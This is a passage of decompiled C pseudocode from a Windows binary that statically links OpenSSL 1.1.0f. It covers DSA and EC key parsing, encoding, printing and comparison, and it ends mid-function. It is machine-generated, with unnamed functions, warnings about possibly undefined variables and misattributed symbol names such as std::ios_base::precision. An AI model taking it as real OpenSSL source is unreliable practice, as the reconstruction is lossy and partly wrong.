__int64 __fastcall sub_1400494D0(__int64 a1, unsigned __int8 **a2)
{
  return sub_14005EC10(*(unsigned int **)(a1 + 32), a2);
}

//----- (00000001400494F0) ----------------------------------------------------
__int64 __fastcall sub_1400494F0(__int64 a1, __int64 a2, int a3)
{
  return sub_14004A110(a1, *(__int64 **)(a2 + 32), a3, 0);
}

//----- (0000000140049510) ----------------------------------------------------
__int64 __fastcall sub_140049510(__int64 a1, __int64 a2, int a3)
{
  int v3; // eax

  return sub_14004A110(a1, *(__int64 **)(a2 + 32), a3, v3 - 39);
}
// 140049521: variable 'v3' is possibly undefined

//----- (0000000140049530) ----------------------------------------------------
__int64 __fastcall sub_140049530(__int64 a1, __int64 a2, int a3)
{
  int v3; // eax

  return sub_14004A110(a1, *(__int64 **)(a2 + 32), a3, v3 - 38);
}
// 140049541: variable 'v3' is possibly undefined

//----- (0000000140049550) ----------------------------------------------------
__int64 __fastcall sub_140049550(__int64 a1, char **a2, __int64 a3)
{
  __int64 v4; // rax

  v4 = sub_14005EB90(0i64, a2, a3);
  if ( v4 )
  {
    sub_14001D1A0(a1, 116, v4);
    return 1i64;
  }
  else
  {
    sub_140024610(10, 122, 10, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 412);
    return 0i64;
  }
}

//----- (00000001400495C0) ----------------------------------------------------
__int64 __fastcall sub_1400495C0(__int64 a1, unsigned __int8 **a2)
{
  return sub_14005EBF0(*(unsigned int **)(a1 + 32), a2);
}

//----- (00000001400495E0) ----------------------------------------------------
__int64 __fastcall sub_1400495E0(__int64 a1, __int64 a2, unsigned int *a3, int a4)
{
  char *v8; // rax
  __int64 v9; // r8
  __int64 *v10; // rax
  __int64 **v11; // rsi
  BOOL v12; // ebx
  __int64 v13; // [rsp+30h] [rbp-28h] BYREF
  __int64 v14[4]; // [rsp+38h] [rbp-20h] BYREF
  char *v15; // [rsp+70h] [rbp+18h] BYREF

  if ( !a3 )
    return (int)sub_14002A1A0(a1, (__int64)"\n") > 0;
  v8 = (char *)*((_QWORD *)a3 + 1);
  v9 = *a3;
  v15 = v8;
  v10 = (__int64 *)sub_14005EBB0(0i64, &v15, v9);
  v11 = (__int64 **)v10;
  if ( !v10 )
    return sub_140060520(a1, (int *)a3, a4);
  v12 = 0;
  sub_14005E890(v10, &v13, v14);
  if ( (unsigned int)sub_14002A430(a1, (__int64)"\n", 1u) == 1 )
  {
    if ( (unsigned int)sub_1400670C0(a1, "r:   ", v13, 0i64, a4) )
      v12 = sub_1400670C0(a1, "s:   ", v14[0], 0i64, a4) != 0;
  }
  sub_14005E840(v11);
  return v12;
}
// 1400495E0: using guessed type __int64 var_20[4];

//----- (00000001400496F0) ----------------------------------------------------
__int64 __fastcall sub_1400496F0(unsigned int *a1, int a2, int a3, _QWORD *a4)
{
  int v5; // edx
  int v6; // edx
  int v7; // edx
  int v9; // ebx
  int v10; // eax
  char **v11; // rax
  __int64 *v12; // rcx
  __int64 v13; // rdx
  int v14; // ebx
  int v15; // eax
  char **v16; // rax
  __int64 *v17; // [rsp+30h] [rbp-18h] BYREF
  __int64 v18[2]; // [rsp+38h] [rbp-10h] BYREF
  unsigned int v19; // [rsp+58h] [rbp+10h] BYREF

  v5 = a2 - 1;
  if ( !v5 )
  {
    if ( a3 )
      return 1i64;
    sub_14007F340(a4, 0i64, v18, &v17);
    if ( v18[0] )
    {
      if ( *(_QWORD *)v18[0] )
      {
        v14 = sub_14002C260(*(_QWORD *)v18[0]);
        if ( v14 )
        {
          v15 = sub_14001D4F0(a1);
          if ( (unsigned int)sub_140035E60(&v19, v14, v15) )
          {
            v16 = sub_14002C0F0(v19);
            v12 = v17;
            v13 = (__int64)v16;
            goto LABEL_13;
          }
        }
      }
    }
    return 0xFFFFFFFFi64;
  }
  v6 = v5 - 2;
  if ( !v6 )
  {
    *(_DWORD *)a4 = 672;
    return 2i64;
  }
  v7 = v6 - 2;
  if ( !v7 )
  {
    if ( a3 )
      return 1i64;
    sub_14007F560(a4, 0i64, 0i64, &v17, v18);
    if ( v17 )
    {
      if ( *v17 )
      {
        v9 = sub_14002C260(*v17);
        if ( v9 )
        {
          v10 = sub_14001D4F0(a1);
          if ( (unsigned int)sub_140035E60(&v19, v9, v10) )
          {
            v11 = sub_14002C0F0(v19);
            v12 = (__int64 *)v18[0];
            v13 = (__int64)v11;
LABEL_13:
            sub_140067440(v12, v13, -1, 0i64);
            return 1i64;
          }
        }
      }
    }
    return 0xFFFFFFFFi64;
  }
  if ( v7 != 3 )
    return 4294967294i64;
  *(_DWORD *)a4 = -1;
  return 1i64;
}

//----- (0000000140049880) ----------------------------------------------------
__int64 __fastcall sub_140049880(__int64 a1, __int64 a2)
{
  __int64 v3; // rdi
  __int64 v4; // rbx
  __int64 v5; // rax
  __int64 v6; // rax
  _QWORD *v8; // [rsp+30h] [rbp-28h] BYREF
  unsigned int *v9; // [rsp+38h] [rbp-20h] BYREF
  char *v10; // [rsp+40h] [rbp-18h] BYREF
  char *v11[2]; // [rsp+48h] [rbp-10h] BYREF
  int v12; // [rsp+70h] [rbp+18h] BYREF
  unsigned int v13; // [rsp+78h] [rbp+20h] BYREF

  v3 = 0i64;
  v4 = 0i64;
  if ( !(unsigned int)sub_140067820(0i64, v11, &v13, &v8, a2) )
    return 0i64;
  sub_1400673E0(0i64, &v12, &v9, v8);
  if ( v12 == 16 )
  {
    v10 = (char *)*((_QWORD *)v9 + 1);
    v4 = sub_14005EBD0(0i64, &v10, *v9);
    if ( !v4 )
    {
      sub_140024610(10, 117, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 42);
LABEL_14:
      sub_14004FD70(v3);
      sub_14002D940(v4);
      return 0i64;
    }
  }
  else
  {
    if ( v12 != 5 && v12 != -1 )
    {
      sub_140024610(10, 117, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 52);
      goto LABEL_14;
    }
    v4 = sub_14002DA60();
    if ( !v4 )
    {
      sub_140024610(10, 117, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 48);
      goto LABEL_14;
    }
  }
  v5 = sub_14004FFF0(0i64, v11, v13);
  v3 = v5;
  if ( !v5 )
  {
    sub_140024610(10, 117, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 57);
    goto LABEL_14;
  }
  v6 = sub_14007DA80(v5, 0i64);
  *(_QWORD *)(v4 + 32) = v6;
  if ( !v6 )
  {
    sub_140024610(10, 117, 108, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 62);
    goto LABEL_14;
  }
  sub_14004FD70(v3);
  sub_14001D1A0(a1, 116, v4);
  return 1i64;
}

//----- (0000000140049A00) ----------------------------------------------------
__int64 __fastcall sub_140049A00(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  int *v3; // rbx
  _DWORD *v5; // rax
  int v7; // eax
  int v8; // esi
  unsigned int *v9; // rax
  __int64 v10; // rdi
  int v11; // ebp
  char **v12; // rax
  unsigned __int8 *v13; // [rsp+58h] [rbp+10h] BYREF

  v2 = *(_QWORD *)(a2 + 32);
  v3 = 0i64;
  v13 = 0i64;
  if ( *(_DWORD *)(a2 + 40) && *(_QWORD *)(v2 + 8) && *(_QWORD *)(v2 + 16) && *(_QWORD *)(v2 + 24) )
  {
    v5 = sub_140047570();
    v3 = v5;
    if ( !v5 )
    {
      sub_140024610(10, 118, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 90);
LABEL_7:
      sub_14001D930(v13);
      sub_140047500((__int64)v3);
      return 0i64;
    }
    v7 = sub_14005EC10((unsigned int *)v2, (unsigned __int8 **)v5 + 1);
    *v3 = v7;
    if ( v7 <= 0 )
    {
      sub_140024610(10, 118, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 95);
      goto LABEL_7;
    }
    v8 = 16;
  }
  else
  {
    v8 = -1;
  }
  v9 = sub_14007DAA0(*(_QWORD *)(v2 + 32), 0i64);
  v10 = (__int64)v9;
  if ( !v9 )
  {
    sub_140024610(10, 118, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 105);
    goto LABEL_7;
  }
  v11 = sub_140050050(v9, &v13);
  sub_14004FD70(v10);
  if ( v11 <= 0 )
  {
    sub_140024610(10, 118, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 113);
    goto LABEL_7;
  }
  v12 = sub_14002C0F0(0x74u);
  if ( !(unsigned int)sub_140067870(a1, (__int64)v12, v8, (__int64)v3, (__int64)v13, v11) )
    goto LABEL_7;
  return 1i64;
}

//----- (0000000140049B60) ----------------------------------------------------
__int64 __fastcall sub_140049B60(__int64 a1, __int64 a2)
{
  __int64 v3; // rdi
  _QWORD *v4; // rbx
  unsigned int v5; // ebp
  __int64 result; // rax
  __int64 v7; // rax
  int *v8; // rsi
  _DWORD *v9; // rax
  _DWORD *v10; // rax
  int *v11; // rax
  _QWORD *v12; // [rsp+30h] [rbp-38h] BYREF
  char *v13; // [rsp+38h] [rbp-30h] BYREF
  unsigned int *v14; // [rsp+40h] [rbp-28h] BYREF
  char *v15; // [rsp+48h] [rbp-20h] BYREF
  unsigned int v16; // [rsp+80h] [rbp+18h] BYREF
  int v17; // [rsp+88h] [rbp+20h] BYREF

  v3 = 0i64;
  v4 = 0i64;
  v5 = 0;
  result = sub_1400675F0(0i64, &v13, &v16, &v12, a2);
  if ( (_DWORD)result )
  {
    sub_1400673E0(0i64, &v17, &v14, v12);
    v7 = sub_14004FFF0(0i64, &v13, v16);
    v8 = (int *)v7;
    if ( v7
      && *(_DWORD *)(v7 + 4) != 258
      && v17 == 16
      && (v15 = (char *)*((_QWORD *)v14 + 1), (v4 = (_QWORD *)sub_14005EBD0(0i64, &v15, *v14)) != 0i64) )
    {
      v9 = sub_1400273B0();
      v4[5] = v9;
      if ( v9 && sub_14007DA80((__int64)v8, (__int64)v9) )
      {
        v10 = sub_140027200();
        v4[4] = v10;
        if ( v10 )
        {
          v11 = (int *)sub_140027CD0();
          v3 = (__int64)v11;
          if ( v11 )
          {
            if ( (unsigned int)sub_14007BD10((_QWORD *)v4[4], v4[3], v4[5], v4[1], v11) )
            {
              sub_14001D1A0(a1, 116, (__int64)v4);
              v5 = 1;
LABEL_18:
              sub_140027BE0(v3);
              sub_140047350(v8);
              return v5;
            }
            sub_140024610(10, 115, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 179);
          }
          else
          {
            sub_140024610(10, 115, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 174);
          }
        }
        else
        {
          sub_140024610(10, 115, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 170);
        }
      }
      else
      {
        sub_140024610(10, 115, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 165);
      }
    }
    else
    {
      sub_140024610(10, 115, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 189);
    }
    sub_14002D940((__int64)v4);
    goto LABEL_18;
  }
  return result;
}

//----- (0000000140049D30) ----------------------------------------------------
__int64 __fastcall sub_140049D30(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  int *v3; // rdi
  _DWORD *v6; // rax
  int v7; // eax
  unsigned int *v8; // rax
  int *v9; // rsi
  int v10; // ebx
  char **v11; // rax
  unsigned __int8 *v13; // [rsp+58h] [rbp+10h] BYREF

  v2 = *(_QWORD *)(a2 + 32);
  v3 = 0i64;
  v13 = 0i64;
  if ( v2 && *(_QWORD *)(v2 + 40) )
  {
    v6 = sub_140047570();
    v3 = v6;
    if ( v6 )
    {
      v7 = sub_14005EC10(*(unsigned int **)(a2 + 32), (unsigned __int8 **)v6 + 1);
      *v3 = v7;
      if ( v7 > 0 )
      {
        v3[1] = 16;
        v8 = sub_14007DAA0(*(_QWORD *)(*(_QWORD *)(a2 + 32) + 40i64), 0i64);
        v9 = (int *)v8;
        if ( v8 )
        {
          v10 = sub_140050050(v8, &v13);
          sub_140047350(v9);
          v11 = sub_14002C0F0(0x74u);
          if ( (unsigned int)sub_140067670(a1, (__int64)v11, 0, 16, (__int64)v3, (__int64)v13, v10) )
            return 1i64;
        }
        else
        {
          sub_140024610(10, 116, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 228);
        }
      }
      else
      {
        sub_140024610(10, 116, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 219);
      }
    }
    else
    {
      sub_140024610(10, 116, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 213);
    }
  }
  else
  {
    sub_140024610(10, 116, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 206);
  }
  sub_14001D930(v13);
  sub_140047500((__int64)v3);
  sub_140047350(0i64);
  return 0i64;
}

//----- (0000000140049EA0) ----------------------------------------------------
__int64 __fastcall sub_140049EA0(__int64 a1)
{
  return sub_14002DD40(*(_QWORD *)(a1 + 32));
}

//----- (0000000140049EC0) ----------------------------------------------------
__int64 __fastcall sub_140049EC0(__int64 a1)
{
  return sub_14002D7A0(*(_QWORD *)(a1 + 32));
}

//----- (0000000140049EE0) ----------------------------------------------------
__int64 __fastcall sub_140049EE0(__int64 a1)
{
  return sub_14002DC20(*(_QWORD *)(a1 + 32));
}

//----- (0000000140049F00) ----------------------------------------------------
__int64 __fastcall sub_140049F00(charNode *a1)
{
  _QWORD *v1; // rax

  v1 = (_QWORD *)*((_QWORD *)a1 + 4);
  if ( v1 && v1[1] && v1[2] && v1[3] )
    return 0i64;
  else
    return charNode::raw_length(a1);
}

//----- (0000000140049F30) ----------------------------------------------------
__int64 __fastcall sub_140049F30(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  _DWORD *v5; // rsi
  _DWORD *v6; // rsi
  _DWORD *v7; // rdi

  if ( *(_QWORD *)(a1 + 32) || (result = sub_14002DA60(), (*(_QWORD *)(a1 + 32) = result) != 0i64) )
  {
    v5 = sub_140026F70(*(_QWORD *)(*(_QWORD *)(a2 + 32) + 8i64));
    if ( v5
      && (sub_140026FF0(*(_DWORD **)(*(_QWORD *)(a1 + 32) + 8i64)),
          *(_QWORD *)(*(_QWORD *)(a1 + 32) + 8i64) = v5,
          (v6 = sub_140026F70(*(_QWORD *)(*(_QWORD *)(a2 + 32) + 16i64))) != 0i64)
      && (sub_140026FF0(*(_DWORD **)(*(_QWORD *)(a1 + 32) + 16i64)),
          *(_QWORD *)(*(_QWORD *)(a1 + 32) + 16i64) = v6,
          (v7 = sub_140026F70(*(_QWORD *)(*(_QWORD *)(a2 + 32) + 24i64))) != 0i64) )
    {
      sub_140026FF0(*(_DWORD **)(*(_QWORD *)(a1 + 32) + 24i64));
      *(_QWORD *)(*(_QWORD *)(a1 + 32) + 24i64) = v7;
      return 1i64;
    }
    else
    {
      return 0i64;
    }
  }
  return result;
}

//----- (000000014004A020) ----------------------------------------------------
_BOOL8 __fastcall sub_14004A020(__int64 a1, __int64 a2)
{
  return !(unsigned int)sub_140026AB0(
                          *(_QWORD *)(*(_QWORD *)(a1 + 32) + 8i64),
                          *(__int64 **)(*(_QWORD *)(a2 + 32) + 8i64))
      && !(unsigned int)sub_140026AB0(
                          *(_QWORD *)(*(_QWORD *)(a1 + 32) + 16i64),
                          *(__int64 **)(*(_QWORD *)(a2 + 32) + 16i64))
      && !(unsigned int)sub_140026AB0(
                          *(_QWORD *)(*(_QWORD *)(a1 + 32) + 24i64),
                          *(__int64 **)(*(_QWORD *)(a2 + 32) + 24i64));
}

//----- (000000014004A0B0) ----------------------------------------------------
_BOOL8 __fastcall sub_14004A0B0(__int64 a1, __int64 a2)
{
  return (unsigned int)sub_140026AB0(
                         *(_QWORD *)(*(_QWORD *)(a2 + 32) + 32i64),
                         *(__int64 **)(*(_QWORD *)(a1 + 32) + 32i64)) == 0;
}

//----- (000000014004A0F0) ----------------------------------------------------
void __fastcall sub_14004A0F0(__int64 a1)
{
  sub_14002D940(*(_QWORD *)(a1 + 32));
}

//----- (000000014004A110) ----------------------------------------------------
__int64 __fastcall sub_14004A110(__int64 a1, __int64 *a2, int a3, int a4)
{
  unsigned int v4; // ebx
  __int64 v8; // r15
  __int64 v9; // r12
  const char *v10; // r14
  unsigned int v11; // eax

  v4 = 0;
  if ( a4 == 2 )
  {
    v8 = a2[5];
    v9 = a2[4];
  }
  else
  {
    v8 = 0i64;
    if ( a4 <= 0 )
      v9 = 0i64;
    else
      v9 = a2[4];
  }
  if ( a4 == 2 )
  {
    v10 = "Private-Key";
  }
  else
  {
    v10 = "Public-Key";
    if ( a4 != 1 )
      v10 = "DSA-Parameters";
  }
  if ( !v8
    || (unsigned int)sub_140029E80(a1, a3, 128)
    && (v11 = sub_140027260(a2[1]), (int)sub_14002A590(a1, "%s: (%d bit)\n", v10, v11) > 0) )
  {
    if ( (unsigned int)sub_1400670C0(a1, "priv:", v8, 0i64, a3)
      && (unsigned int)sub_1400670C0(a1, "pub: ", v9, 0i64, a3)
      && (unsigned int)sub_1400670C0(a1, "P:   ", a2[1], 0i64, a3)
      && (unsigned int)sub_1400670C0(a1, "Q:   ", a2[2], 0i64, a3)
      && (unsigned int)sub_1400670C0(a1, "G:   ", a2[3], 0i64, a3) )
    {
      return 1;
    }
  }
  return v4;
}

//----- (000000014004A290) ----------------------------------------------------
__int64 __fastcall sub_14004A290(__int64 a1, __int64 a2)
{
  __int64 v2; // rsi
  void *v4; // rbx
  int v6; // eax
  void *v7; // rax
  int v8; // esi
  char **v9; // rax
  int v10; // [rsp+58h] [rbp+10h] BYREF
  char **v11; // [rsp+60h] [rbp+18h] BYREF
  void *v12; // [rsp+68h] [rbp+20h] BYREF

  v2 = *(_QWORD *)(a2 + 32);
  v4 = 0i64;
  v11 = 0i64;
  if ( (unsigned int)sub_14004BA90(&v10, &v11, v2) )
  {
    v6 = sub_140066EA0(v2, 0i64);
    if ( v6 > 0
      && (v7 = sub_14001D8E0(v6), (v4 = v7) != 0i64)
      && (v12 = v7, v8 = sub_140066EA0(v2, &v12), v8 > 0)
      && (v9 = sub_14002C0F0(0x198u), (unsigned int)sub_140067870(a1, (__int64)v9, v10, (__int64)v11, (__int64)v4, v8)) )
    {
      return 1i64;
    }
    else
    {
      if ( v10 == 6 )
        sub_14003F4D0((__int64)v11);
      else
        sub_140047500((__int64)v11);
      sub_14001D930(v4);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 216, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 67);
    return 0i64;
  }
}

//----- (000000014004A3B0) ----------------------------------------------------
__int64 __fastcall sub_14004A3B0(__int64 a1, __int64 a2)
{
  __int64 **v4; // [rsp+30h] [rbp-28h] BYREF
  _BYTE *v5; // [rsp+38h] [rbp-20h] BYREF
  _QWORD *v6; // [rsp+40h] [rbp-18h] BYREF
  __int64 v7; // [rsp+48h] [rbp-10h] BYREF
  int v8; // [rsp+70h] [rbp+18h] BYREF
  int v9; // [rsp+78h] [rbp+20h] BYREF

  v5 = 0i64;
  v4 = 0i64;
  if ( !(unsigned int)sub_140067820(0i64, &v5, &v9, &v6, a2) )
    return 0i64;
  sub_1400673E0(0i64, &v8, &v7, v6);
  v4 = sub_14004BB90(v8, v7);
  if ( !v4 )
  {
    sub_140024610(16, 215, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 150);
    return 0i64;
  }
  if ( sub_140067000((__int64 *)&v4, &v5, v9) )
  {
    sub_14001D1A0(a1, 408, (__int64)v4);
    return 1i64;
  }
  else
  {
    sub_140024610(16, 215, 142, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 156);
    sub_14001C600((__int64)v4);
    return 0i64;
  }
}

//----- (000000014004A4B0) ----------------------------------------------------
__int64 __fastcall sub_14004A4B0(__int64 a1, __int64 a2)
{
  __int64 v4; // rsi
  _QWORD *v5; // rbx
  _QWORD *v6; // rax
  int v7; // ecx
  __int64 result; // rax

  v4 = sub_14001C740(*(_QWORD *)(a2 + 32));
  v5 = (_QWORD *)std::ios_base::precision(*(std::ios_base **)(a1 + 32));
  v6 = (_QWORD *)std::ios_base::precision(*(std::ios_base **)(a2 + 32));
  if ( !v4 || !v5 || !v6 )
    return 4294967294i64;
  v7 = sub_1400220E0(v4, v5, v6);
  if ( !v7 )
    return 1i64;
  result = 4294967294i64;
  if ( v7 == 1 )
    return 0i64;
  return result;
}

//----- (000000014004A560) ----------------------------------------------------
__int64 __fastcall sub_14004A560(__int64 a1, __int64 a2)
{
  __int64 **v4; // [rsp+30h] [rbp-28h] BYREF
  char *v5; // [rsp+38h] [rbp-20h] BYREF
  _QWORD *v6; // [rsp+40h] [rbp-18h] BYREF
  __int64 v7; // [rsp+48h] [rbp-10h] BYREF
  int v8; // [rsp+70h] [rbp+18h] BYREF
  unsigned int v9; // [rsp+78h] [rbp+20h] BYREF

  v5 = 0i64;
  v4 = 0i64;
  if ( !(unsigned int)sub_1400675F0(0i64, &v5, &v9, &v6, a2) )
    return 0i64;
  sub_1400673E0(0i64, &v8, &v7, v6);
  v4 = sub_14004BB90(v8, v7);
  if ( !v4 )
  {
    sub_140024610(16, 213, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 211);
LABEL_6:
    sub_14001C600((__int64)v4);
    return 0i64;
  }
  if ( !sub_1400662D0((__int64 *)&v4, &v5, v9) )
  {
    sub_140024610(16, 213, 142, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 203);
    goto LABEL_6;
  }
  sub_14001D1A0(a1, 408, (__int64)v4);
  return 1i64;
}

//----- (000000014004A650) ----------------------------------------------------
__int64 __fastcall sub_14004A650(__int64 a1, __int64 a2)
{
  __int128 *v2; // rax
  __int64 v4; // rax
  __int64 v5; // rbx
  unsigned int v6; // eax
  char **v7; // rbx
  int v8; // esi
  _DWORD *v9; // rax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // ebp
  unsigned __int8 *v15; // rax
  unsigned __int8 *v16; // rdi
  char **v17; // rax
  __int128 v18[6]; // [rsp+40h] [rbp-68h] BYREF
  unsigned __int8 *v19; // [rsp+B8h] [rbp+10h] BYREF

  v2 = *(__int128 **)(a2 + 32);
  v18[0] = *v2;
  v18[1] = v2[1];
  v18[2] = v2[2];
  v18[3] = v2[3];
  v18[4] = v2[4];
  v4 = sub_14001C740((__int64)v18);
  v5 = v4;
  if ( !v4 )
  {
    sub_140024610(16, 223, 124, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 31);
    goto LABEL_21;
  }
  if ( !(unsigned int)sub_140021A00(v4) || (v6 = sub_140021B00(v5)) == 0 )
  {
    v9 = sub_140047570();
    v7 = (char **)v9;
    if ( v9 )
    {
      v10 = sub_140066C20((__int64)v18, (unsigned __int8 **)v9 + 1);
      *(_DWORD *)v7 = v10;
      if ( v10 > 0 )
      {
        v8 = 16;
        goto LABEL_9;
      }
      sub_140047500((__int64)v7);
      sub_140024610(16, 223, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 49);
    }
LABEL_21:
    sub_140024610(16, 214, 142, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 226);
    return 0i64;
  }
  v7 = sub_14002C0F0(v6);
  v8 = 6;
LABEL_9:
  v11 = sub_14001C780((__int64)v18);
  sub_14001CAD0((__int64)v18, v11 | 1);
  v12 = sub_140066C70((__int64)v18, 0i64);
  v13 = v12;
  if ( !v12 )
  {
    sub_140024610(16, 214, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 241);
    return 0i64;
  }
  v15 = (unsigned __int8 *)sub_14001D8E0(v12);
  v16 = v15;
  if ( v15 )
  {
    v19 = v15;
    if ( (unsigned int)sub_140066C70((__int64)v18, &v19) )
    {
      v17 = sub_14002C0F0(0x198u);
      if ( (unsigned int)sub_140067670(a1, (__int64)v17, 0, v8, (__int64)v7, (__int64)v16, v13) )
        return 1i64;
      sub_14001D930(v16);
    }
    else
    {
      sub_14001D930(v16);
      sub_140024610(16, 214, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 252);
    }
  }
  else
  {
    sub_140024610(16, 214, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 246);
  }
  return 0i64;
}

//----- (000000014004A8D0) ----------------------------------------------------
__int64 __fastcall sub_14004A8D0(__int64 a1)
{
  return sub_1400653D0(*(_QWORD *)(a1 + 32));
}

//----- (000000014004A8F0) ----------------------------------------------------
__int64 __fastcall sub_14004A8F0(__int64 a1)
{
  __int64 v1; // rax

  v1 = sub_14001C740(*(_QWORD *)(a1 + 32));
  return sub_140021D20(v1);
}

//----- (000000014004A920) ----------------------------------------------------
__int64 __fastcall sub_14004A920(__int64 a1)
{
  __int64 v1; // rax
  int v2; // eax

  v1 = sub_14001C740(*(_QWORD *)(a1 + 32));
  v2 = sub_140021D20(v1);
  if ( v2 >= 512 )
    return 256i64;
  if ( v2 >= 384 )
    return 192i64;
  if ( v2 >= 256 )
    return 128i64;
  if ( v2 >= 224 )
    return 112i64;
  if ( v2 < 160 )
    return (unsigned int)(v2 / 2);
  return 80i64;
}

//----- (000000014004A9A0) ----------------------------------------------------
_BOOL8 __fastcall sub_14004A9A0(__int64 a1)
{
  __int64 v1; // rcx

  v1 = *(_QWORD *)(a1 + 32);
  return !v1 || !sub_14001C740(v1);
}

//----- (000000014004A9E0) ----------------------------------------------------
__int64 __fastcall sub_14004A9E0(__int64 a1, __int64 a2)
{
  __int64 *v3; // rax
  __int64 *v4; // rdi
  __int64 v6; // rax

  v3 = (__int64 *)sub_14001C740(*(_QWORD *)(a2 + 32));
  v4 = sub_1400218A0(v3);
  if ( !v4 )
    return 0i64;
  if ( !*(_QWORD *)(a1 + 32) )
  {
    v6 = sub_14001C7F0();
    *(_QWORD *)(a1 + 32) = v6;
    if ( !v6 )
      return 0i64;
  }
  if ( !(unsigned int)sub_14001CAF0(*(__int64 ***)(a1 + 32), v4) )
    return 0i64;
  sub_140021910(v4);
  return 1i64;
}

//----- (000000014004AA60) ----------------------------------------------------
__int64 __fastcall sub_14004AA60(__int64 a1, __int64 a2)
{
  __int64 v3; // rdi
  __int64 v4; // rax

  v3 = sub_14001C740(*(_QWORD *)(a1 + 32));
  v4 = sub_14001C740(*(_QWORD *)(a2 + 32));
  if ( v3 && v4 )
    return (unsigned int)sub_140021440(v3, v4, 0i64) == 0;
  else
    return 4294967294i64;
}

//----- (000000014004AAD0) ----------------------------------------------------
void __fastcall sub_14004AAD0(__int64 a1)
{
  sub_14001C600(*(_QWORD *)(a1 + 32));
}

//----- (000000014004AAF0) ----------------------------------------------------
__int64 __fastcall sub_14004AAF0(__int64 a1, char **a2, unsigned int a3)
{
  __int64 v4; // rax

  v4 = sub_1400661B0(0i64, a2, a3);
  if ( v4 )
  {
    sub_14001D1A0(a1, 408, v4);
    return 1i64;
  }
  else
  {
    sub_140024610(16, 212, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 406);
    return 0i64;
  }
}

//----- (000000014004AB60) ----------------------------------------------------
__int64 __fastcall sub_14004AB60(__int64 a1, unsigned __int8 **a2)
{
  return sub_140066C20(*(_QWORD *)(a1 + 32), a2);
}

//----- (000000014004AB80) ----------------------------------------------------
__int64 __fastcall sub_14004AB80(__int64 a1, __int64 a2, unsigned int a3)
{
  int v3; // eax

  return sub_14004AEE0(a1, *(std::ios_base **)(a2 + 32), a3, v3 - 38);
}
// 14004AB91: variable 'v3' is possibly undefined

//----- (000000014004ABA0) ----------------------------------------------------
__int64 __fastcall sub_14004ABA0(__int64 a1, __int64 a2, unsigned int a3)
{
  int v3; // eax

  return sub_14004AEE0(a1, *(std::ios_base **)(a2 + 32), a3, v3 - 39);
}
// 14004ABB1: variable 'v3' is possibly undefined

//----- (000000014004ABC0) ----------------------------------------------------
__int64 __fastcall sub_14004ABC0(__int64 a1, __int64 a2, unsigned int a3)
{
  return sub_14004AEE0(a1, *(std::ios_base **)(a2 + 32), a3, 0);
}

//----- (000000014004ABE0) ----------------------------------------------------
__int64 __fastcall sub_14004ABE0(__int64 a1, char **a2, __int64 a3)
{
  __int64 v4; // rax

  v4 = sub_1400662D0(0i64, a2, a3);
  if ( v4 )
  {
    sub_14001D1A0(a1, 408, v4);
    return 1i64;
  }
  else
  {
    sub_140024610(16, 222, 142, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 442);
    return 0i64;
  }
}

//----- (000000014004AC50) ----------------------------------------------------
__int64 __fastcall sub_14004AC50(__int64 a1, unsigned __int8 **a2)
{
  return sub_140066C70(*(_QWORD *)(a1 + 32), a2);
}

//----- (000000014004AC70) ----------------------------------------------------
__int64 __fastcall sub_14004AC70(unsigned int *a1, int a2, int a3, _QWORD *a4)
{
  int v6; // ebx
  int v7; // eax
  char **v8; // rax
  __int64 result; // rax
  int v10; // ebx
  int v11; // eax
  char **v12; // rax
  __int64 v13; // rbx
  __int64 v14; // rax
  __int64 v15; // rax
  __int64 *v16; // [rsp+30h] [rbp-18h] BYREF
